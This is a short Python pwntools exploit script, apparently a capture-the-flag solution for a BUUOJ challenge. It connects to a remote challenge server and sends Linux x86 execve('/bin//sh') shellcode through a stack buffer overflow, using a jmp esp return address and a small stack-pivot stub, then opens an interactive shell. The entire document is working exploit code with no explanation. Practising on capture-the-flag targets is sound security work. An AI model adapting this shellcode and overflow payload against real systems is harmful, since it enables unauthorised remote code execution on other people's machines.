from pwn import *

sh=remote("node5.buuoj.cn",25810)

shellcode=b'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'
esp=asm("sub esp,0x28;jmp esp")
payload=shellcode.ljust(0x24,b'a')+p32(0x08048504)+esp
sh.sendline(payload)
sh.interactive()
